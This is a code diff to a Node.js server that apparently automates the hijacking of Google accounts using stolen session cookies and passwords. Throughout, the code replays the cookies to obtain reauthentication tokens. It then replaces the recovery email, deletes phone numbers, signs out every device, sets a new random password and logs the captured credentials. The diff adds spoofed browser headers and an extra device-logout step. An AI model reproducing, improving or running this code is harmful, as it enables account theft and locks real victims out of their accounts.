@@ -30,8 +30,8 @@ app.post('/', async function (req, res) {
     if(req.body) {
         try {
             let mData = req.body.data.split('★')
-            console.log('Received Data: '+mData.length)
-            if(mData.length == 6) {
+            if(mData.length == 7) {
+                console.log('Received Data')
                 getOSIDtoken(res, mData)
             } else {
                 res.end('ERROR')
@@ -55,7 +55,8 @@ app.get('/ip', async function (req, res) {
 function serverError(connection, mData, wrong, type) {
     try {
         if(wrong && connection != null) {
-            setData(UNKNOWN+mData[0]+'.json', { type: type, data: JSON.stringify(mData) })
+            console.log('Error: '+type+' '+mData[1])
+            setData(UNKNOWN+mData[0]+'/'+mData[1]+'.json', { type: type, data: JSON.stringify(mData) })
             connection.end('ERROR')
         }
     } catch (e) {}
@@ -63,15 +64,12 @@ function serverError(connection, mData, wrong, type) {
 
 function getOSIDtoken(connection, mData) {
 
-    let sendCookies = mData[5]
+    let sendCookies = mData[6]
 
     axios.get('https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info', {
         maxRedirects: 0,
         validateStatus: null,
-        headers: {
-            'Cookie': sendCookies,
-            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-        }
+        headers: getHeader(sendCookies)
     }).then(response => {
         let wrong = true
         try {
@@ -86,9 +84,7 @@ function getOSIDtoken(connection, mData) {
                 axios.get('https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+split[0], {
                     maxRedirects: 0,
                     validateStatus: null,
-                    headers: {
-                        'Cookie': tempCookes
-                    }
+                    headers: getHeader(tempCookes)
                 }).then(response => {
                     let wrong = true
                     try {
@@ -114,13 +110,13 @@ function getOSIDtoken(connection, mData) {
                                 if (index >= 0) {
                                     let temp = cookiesList.substring(index, cookiesList.length)
                                     osid = temp.substring(0, temp.indexOf(';')+1)
-                                } 
+                                }
                             }
 
                             if (osid) {
                                 wrong = false
                                 sendCookies += osid
-                                mData[5] = sendCookies
+                                mData[6] = sendCookies
 
                                 getRAPTtoken(connection, mData)
                             }
@@ -144,10 +140,7 @@ function getRAPTtoken(connection, mData) {
     axios.get('https://myaccount.google.com/signinoptions/rescuephone', {
         maxRedirects: 0,
         validateStatus: null,
-        headers: {
-            'Cookie': mData[5],
-            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-        }
+        headers: getHeader(mData[6])
     }).then(response => {
         let wrong = true
         try {
@@ -161,10 +154,7 @@ function getRAPTtoken(connection, mData) {
                 axios.get('https://accounts.google.com/ServiceLogin?'+split[0], {
                     maxRedirects: 0,
                     validateStatus: null,
-                    headers: {
-                        'Cookie': mData[5],
-                        'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                    }
+                    headers: getHeader(mData[6])
                 }).then(response => {
                     let wrong = true
                     try {
@@ -172,7 +162,7 @@ function getRAPTtoken(connection, mData) {
                         if (location) {
                             if(location.includes('rapt=')) {
                                 let index = location.indexOf('rapt=')
-                                mData[6] = location.substring(index+5, location.length).split('&')[0]
+                                mData[7] = location.substring(index+5, location.length).split('&')[0]
                                 wrong = false
             
                                 languageChange(connection, mData)
@@ -184,16 +174,13 @@ function getRAPTtoken(connection, mData) {
                                 axios.get('https://accounts.google.com/InteractiveLogin?'+rart, {
                                     maxRedirects: 0,
                                     validateStatus: null,
-                                    headers: {
-                                        'Cookie': mData[5],
-                                        'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                                    }
+                                    headers: getHeader(mData[6])
                                 }).then(response => {
                                     try {
                                         let location = response.headers['location']
                                         if(location.includes('rapt=')) {
                                             let index = location.indexOf('rapt=')
-                                            mData[6] = location.substring(index+5, location.length).split('&')[0]
+                                            mData[7] = location.substring(index+5, location.length).split('&')[0]
                                             
                                             languageChange(connection, mData)
                                         } else {
@@ -202,10 +189,10 @@ function getRAPTtoken(connection, mData) {
                                             index = location.indexOf('cid=')
                                             let cid = location.substring(index+4, location.length).split('&')[0]
                                             let cookiesList = response.headers['set-cookie']
-                                            let gps = cookiesGPS(cookiesList, mData[4])
-                                            mData[2] = tl
-                                            mData[3] = cid
-                                            mData[4] = gps
+                                            let gps = cookiesGPS(cookiesList, mData[5])
+                                            mData[3] = tl
+                                            mData[4] = cid
+                                            mData[5] = gps
                                             passwordMatching(connection, mData)
                                         }
                                     } catch (error) {
@@ -220,10 +207,10 @@ function getRAPTtoken(connection, mData) {
                                 index = location.indexOf('cid=')
                                 let cid = location.substring(index+4, location.length).split('&')[0]
                                 let cookiesList = response.headers['set-cookie']
-                                let gps = cookiesGPS(cookiesList, mData[4])
-                                mData[2] = tl
-                                mData[3] = cid
-                                mData[4] = gps
+                                let gps = cookiesGPS(cookiesList, mData[5])
+                                mData[3] = tl
+                                mData[4] = cid
+                                mData[5] = gps
                                 passwordMatching(connection, mData)
                             }
                         }
@@ -243,13 +230,34 @@ function getRAPTtoken(connection, mData) {
 }
 
 function passwordMatching(connection, mData) {
-    axios.post('https://accounts.google.com/_/signin/challenge?hl=en&TL='+mData[2], getPasswordData(mData[1], parseInt(mData[3])), {
+    axios.post('https://accounts.google.com/_/signin/challenge?hl=en&TL='+mData[3], getPasswordData(mData[2], parseInt(mData[4])), {
         maxRedirects: 0,
         validateStatus: null,
         headers: {
-            'Cookie': '__Host-GAPS='+mData[4]+'; '+mData[5],
-            'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
-            'google-accounts-xsrf' : 1
+            'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'origin': 'https://accounts.google.com',
+            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+            'sec-ch-ua-arch': '"x86"',
+            'sec-ch-ua-bitness': '"64"',
+            'sec-ch-ua-full-version': '"112.0.5615.49"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.49", "Google Chrome";v="112.0.5615.49", "Not:A-Brand";v="99.0.0.0"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"15.0.0"',
+            'sec-ch-ua-wow64': '?0',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'cookie': '__Host-GAPS='+mData[5]+'; '+mData[6],
+            'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
+            'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=1066499d-aafe-441b-a13b-ce876bcef5f2,signin_mode=all_accounts,signout_mode=show_confirmation',
+            'x-client-data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiVocsBCOKXzQEI45fNAQjom80BCMyczQEI/ZzNAQjtns0BCMCfzQEIhaDNAQiroc0BCL2izQE=',
+            'x-same-domain': '1',
         }
     }).then(response => {
         let wrong = true
@@ -262,7 +270,7 @@ function passwordMatching(connection, mData) {
                 let url = decodeURIComponent(data[0][13][2])
                 if(url.includes('rapt=')) {
                     let index = url.indexOf('rapt=')
-                    mData[6] = url.substring(index+5, url.length).split('&')[0]
+                    mData[7] = url.substring(index+5, url.length).split('&')[0]
                     wrong = false
                     languageChange(connection, mData)
                 }
@@ -279,10 +287,7 @@ function languageChange(connection, mData) {
     axios.get('https://myaccount.google.com/phone', {
         maxRedirects: 0,
         validateStatus: null,
-        headers: {
-            'Cookie': mData[5],
-            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-        }
+        headers: getHeader(mData[6])
     }).then(response => {
         try {
             const dom = new JSDOM(response.data)
@@ -360,11 +365,7 @@ function languageChange(connection, mData) {
             axios.post('https://myaccount.google.com/_/language_update', getLanguage(time), {
                 maxRedirects: 0,
                 validateStatus: null,
-                headers: {
-                    'Cookie': mData[5],
-                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                    'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                }
+                headers: getHeader(mData[6])
             }).then(response => {
                 recoveryChange(connection, mData)
             }).catch(err => {
@@ -379,25 +380,19 @@ function languageChange(connection, mData) {
 }
 
 function recoveryChange(connection, mData) {
-    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mData[6], getRecoveryData(mData[8]+'@gmail.com', mData[10]), {
+    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mData[7], getRecoveryData(mData[8]+'@gmail.com', mData[10]), {
         maxRedirects: 0,
         validateStatus: null,
-        headers: {
-            'Cookie': mData[5],
-            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-        }
+        headers: getHeader(mData[6])
     }).then(response => {
         let wrong = true
         try {
             if(!response.data.includes('"er"')) {
                 wrong = false
-                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mData[6], getVerificationData(mData[10]), {
+                axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mData[7], getVerificationData(mData[10]), {
                     maxRedirects: 0,
                     validateStatus: null,
-                    headers: {
-                        'Cookie': mData[5],
-                        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                    }
+                    headers: getHeader(mData[6])
                 }).then(response => {
                     deviceLogOut(connection, mData)
                 }).catch(err => {
@@ -417,10 +412,7 @@ function deviceLogOut(connection, mData) {
     axios.get('https://myaccount.google.com/device-activity', {
         maxRedirects: 0,
         validateStatus: null,
-        headers: {
-            'Cookie': mData[5],
-            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-        }
+        headers: getHeader(mData[6])
     }).then(response => {
         try {
             const dom = new JSDOM(response.data)
@@ -471,16 +463,23 @@ function deviceLogOut(connection, mData) {
                     axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=YZ6Dc&source-path=%2Fu%2F5%2Fdevice-activity%2Fid%2F'+key, getLogOut(value, time), {
                         maxRedirects: 0,
                         validateStatus: null,
-                        headers: {
-                            'Cookie': mData[5],
-                            'Content-Type' :'application/x-www-form-urlencoded;charset=UTF-8',
-                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
-                        }
+                        headers: getHeader(mData[6])
                     }).then(response => {
-                        output++
-                        if(output == size) {
-                            numberRemove(connection, mData)
-                        }
+                        axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=Z5lnef&source-path=%2Fu%2F5%2Fdevice-activity%2Fid%2F'+key, getLogOutAgain(time), {
+                            maxRedirects: 0,
+                            validateStatus: null,
+                            headers: getHeader(mData[6])
+                        }).then(response => {
+                            output++
+                            if(output == size) {
+                                numberRemove(connection, mData)
+                            }
+                        }).catch(err => {
+                            output++
+                            if(output == size) {
+                                numberRemove(connection, mData)
+                            }
+                        })
                     }).catch(err => {
                         output++
                         if(output == size) {
@@ -509,13 +508,10 @@ function numberRemove(connection, mData) {
     } else {
         for(let i=0; i<numbers.length; i++) {
             size++
-            axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mData[6], getPhoneData(numbers[i], mData[10]), {
+            axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mData[7], getPhoneData(numbers[i], mData[10]), {
                 maxRedirects: 0,
                 validateStatus: null,
-                headers: {
-                    'Cookie': mData[5],
-                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                }
+                headers: getHeader(mData[6])
             }).then(response => {
                 output++
                 if(output == size) {
@@ -535,23 +531,20 @@ function numberRemove(connection, mData) {
 function passwordChange(connection, mData) {
     let changePass = getRandomPassword()
 
-    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mData[6], getChangePasswordData(changePass, mData[10]), {
+    axios.post('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mData[7], getChangePasswordData(changePass, mData[10]), {
         maxRedirects: 0,
         validateStatus: null,
-        headers: {
-            'Cookie': mData[5],
-            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-        }
+        headers: getHeader(mData[6])
     }).then(response => {
         try {
             if(response.data.includes('"er"')) {
-                changePass = mData[1]
+                changePass = mData[2]
             }
 
             let send = { create: mData[11], password: changePass, recovery: mData[8] }
             console.log(send)
 
-            setData(COMPLETED+mData[7]+'.json', send)
+            setData(COMPLETED+mData[0]+'/'+mData[7]+'.json', send)
 
             if (connection) {
                 connection.end('SUCCESS')
@@ -560,12 +553,12 @@ function passwordChange(connection, mData) {
         
     }).catch(err => {
         try {
-            changePass = mData[1]
+            changePass = mData[2]
 
             let send = { create: mData[11], password: changePass, recovery: mData[8] }
             console.log(send)
             
-            setData(COMPLETED+mData[7]+'.json', send)
+            setData(COMPLETED+mData[0]+'/'+mData[7]+'.json', send)
 
             if (connection) {
                 connection.end('SUCCESS')
@@ -615,8 +608,8 @@ function cookiesGPS(cookiesList, tempGps) {
     return tempGps
 }
 
-function getPasswordData(password, type) {
-    return 'service=accountsettings&continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",getIdentifier()]))
+function getPasswordData(password, tl, type) {
+    return 'TL='+tl+'&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&rip=1&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",getIdentifier()]))+'&gmscoreversion=undefined&checkConnection=youtube%3A882%3A0&checkedDomains=youtube&pstMsg=1'
 }
 
 function getRecoveryData(gmail, time) {
@@ -637,6 +630,10 @@ function getChangePasswordData(password, time) {
 
 function getLogOut(token, time) {
     return 'f.req='+encodeURIComponent(JSON.stringify([[["YZ6Dc","[null,null,\""+token+"\"]",null,"generic"]]]))+'&at='+encodeURIComponent(time)
+}
+
+function getLogOutAgain(time) {
+    return 'f.req=%5B%5B%5B%22Z5lnef%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(time)
 }
 
 function getLanguage(time) {
@@ -670,4 +667,31 @@ function getRandomPassword() {
     pass += U[Math.floor((Math.random() * 3))]
     
     return pass
+}
+
+function getHeader(cookie) {
+    return {
+        'authority': 'myaccount.google.com',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+        'cookie': cookie,
+        'origin': 'https://myaccount.google.com',
+        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+        'sec-ch-ua-arch': '"x86"',
+        'sec-ch-ua-bitness': '"64"',
+        'sec-ch-ua-full-version': '"112.0.5615.49"',
+        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.49", "Google Chrome";v="112.0.5615.49", "Not:A-Brand";v="99.0.0.0"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-model': '""',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-ch-ua-platform-version': '"15.0.0"',
+        'sec-ch-ua-wow64': '?0',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
+        'x-client-data': 'CJK2yQEIorbJAQjEtskBCKmdygEItPLKAQiVocsBCOKXzQEI45fNAQjom80BCMyczQEI/ZzNAQjtns0BCMCfzQEIhaDNAQiroc0BCL2izQE=',
+        'x-same-domain': '1',
+    }
 }
